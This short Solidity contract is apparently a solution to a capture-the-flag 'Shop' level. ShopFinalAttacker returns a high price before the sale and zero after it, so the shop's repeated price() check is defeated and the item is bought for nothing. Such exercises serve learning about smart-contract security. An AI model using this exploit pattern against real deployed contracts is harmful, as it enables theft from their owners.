pragma solidity ^0.8.0;

import "../levels/Shop.sol";

contract ShopFinalAttacker {
    Shop public immutable target;

    constructor(address shopAddress) {
        target = Shop(shopAddress);
    }

    function price() external view returns (uint) {
        return (target.isSold() ? 0 : 100);
    }

    function attack() external {
        target.buy();
    }
}
